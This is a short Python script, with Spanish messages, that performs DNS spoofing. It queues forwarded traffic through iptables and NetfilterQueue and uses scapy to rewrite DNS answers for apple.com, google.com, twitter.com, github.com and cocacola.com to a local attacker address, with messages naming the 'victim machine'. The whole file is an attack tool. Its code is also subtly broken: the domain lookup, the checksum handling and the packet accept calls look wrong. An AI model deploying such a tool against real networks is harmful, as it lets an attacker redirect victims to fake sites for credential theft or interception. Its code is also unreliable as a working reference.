from scapy.all import *
from netfilterqueue import NetfilterQueue
import os

mapping = {
    "apple.com" : "192.168.0.101",
    "google.com" : "192.168.0.101",
    "twitter.com" : "192.168.0.101",
    "github.com" : "192.168.0.101",
    "cocacola.com": "192.168.0.101"
}
def paquetedns(packet):
    packet = IP(packet.get_payload())
    if packet.haslayer(DNSRR):
        print ("Paquetes antes: ", packet.summary())
        try:
            packet = modificarpaquete(packet)
        except IndexError:
            print ("No hay paquetes DNS de la maquina Victima")
        print ("Paquetes Despues: ", packet.summary())
        packet.set_payload(bytes(packet))
    packet.accept()


def modificarpaquete(packet):
    qname = packet[DNSQR].qname
    if qname not in mapping:
        print ("Paquete no modificado debido a que el spoofing de ese dominio no esta definido", qname)
        return packet
    packet[DNS].an = DNSRR(rrname = qname, rdata = mapping[qname])
    packet[DNS].ancount = 1
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].len
    return packet
if __name__ == "__main__":
    while True:

        try:
            numerodecola = 0
            os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(numerodecola))
            cola = NetfilterQueue()
            cola.bind(numerodecola, paquetedns)
            cola.run()
            print (numerodecola)
        except Exception as e:
                os.system("iptables --flush")
                print(type(e).__name__, e)
